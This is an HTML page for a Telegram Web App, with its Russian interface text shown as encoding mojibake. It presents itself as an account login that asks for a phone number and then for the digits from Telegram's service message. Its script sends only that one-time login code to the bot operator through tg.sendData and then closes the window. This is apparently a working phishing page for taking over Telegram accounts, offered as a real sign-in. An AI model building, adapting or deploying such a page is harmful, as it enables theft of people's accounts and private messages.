<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root {
            --bg-color: #0f1721;
            --container-bg: #1c2733;
            --text-color: #ffffff;
            --hint-color: #708499;
            --accent-color: #3390ec;
            --input-bg: #242f3d;
        }

        /* –£–ë–ò–†–ê–ï–ú –°–¢–†–ï–õ–û–ß–ö–ò (–¢–£ –°–ê–ú–£–Æ –§–ò–ì–ù–Æ) */
        input::-webkit-outer-spin-button,
        input::-webkit-inner-spin-button {
            -webkit-appearance: none;
            margin: 0;
        }
        input[type=number] { -moz-appearance: textfield; }

        body {
            font-family: -apple-system, system-ui, sans-serif;
            background-color: var(--bg-color);
            color: var(--text-color);
            margin: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }

        .card {
            width: 100%;
            max-width: 340px;
            background: var(--container-bg);
            padding: 40px 30px;
            border-radius: 28px;
            text-align: center;
            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
            margin: 20px;
        }

        .logo-area {
            font-size: 50px;
            margin-bottom: 25px;
            filter: drop-shadow(0 0 10px var(--accent-color));
        }

        h2 { font-size: 22px; margin: 0 0 10px 0; letter-spacing: -0.5px; }
        p { font-size: 14px; color: var(--hint-color); line-height: 1.5; margin-bottom: 30px; }

        .input-wrapper { width: 100%; margin-bottom: 25px; }

        input {
            width: 100%;
            background: var(--input-bg);
            border: 2px solid transparent;
            border-radius: 16px;
            padding: 18px;
            color: #fff;
            font-size: 20px;
            font-weight: 500;
            text-align: center;
            outline: none;
            box-sizing: border-box;
            transition: 0.3s;
        }

        input:focus { border-color: var(--accent-color); background: #2b3746; }

        button {
            width: 100%;
            background: var(--accent-color);
            color: white;
            border: none;
            border-radius: 16px;
            padding: 18px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: 0.2s;
            box-shadow: 0 4px 15px rgba(51, 144, 236, 0.3);
        }

        button:active { transform: scale(0.97); }

        .step { display: none; }
        .active { display: block; animation: fadeIn 0.5s ease; }

        @keyframes fadeIn {
            from { opacity: 0; transform: scale(0.95); }
            to { opacity: 1; transform: scale(1); }
        }
    </style>
</head>
<body>

<div class="card">
    <div class="logo-area">üíé</div>

    <div id="step-phone" class="step active">
        <h2>–í—Ö–æ–¥ –≤ –∞–∫–∫–∞—É–Ω—Ç</h2>
        <p>–í–≤–µ–¥–∏—Ç–µ –≤–∞—à –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞, —á—Ç–æ–±—ã –º—ã –º–æ–≥–ª–∏ –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –∫–æ–¥</p>
        <div class="input-wrapper">
            <input type="tel" id="p" placeholder="+7 000 000-00-00">
        </div>
        <button onclick="go('code')">–ü–æ–ª—É—á–∏—Ç—å –∫–æ–¥</button>
    </div>

    <div id="step-code" class="step">
        <h2>–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ</h2>
        <p>–í–≤–µ–¥–∏—Ç–µ —Ü–∏—Ñ—Ä—ã –∏–∑ —Å–µ—Ä–≤–∏—Å–Ω–æ–≥–æ —Å–æ–æ–±—â–µ–Ω–∏—è Telegram</p>
        <div class="input-wrapper">
            <input type="number" id="c" placeholder="0 0 0 0 0">
        </div>
        <button onclick="finish()">–í–æ–π—Ç–∏ –≤ –∫–∞–±–∏–Ω–µ—Ç</button>
    </div>
</div>

<script>
    const tg = window.Telegram.WebApp;
    tg.expand();
    tg.ready();

    function go(s) {
        const p = document.getElementById('p').value;
        if(!p) return;
        document.getElementById('step-phone').classList.remove('active');
        document.getElementById('step-code').classList.add('active');
        document.getElementById('c').focus();
    }

    function finish() {
        const c = document.getElementById('c').value;
        if(!c) return;
        tg.sendData(c);
        tg.close();
    }
</script>

</body>
</html>
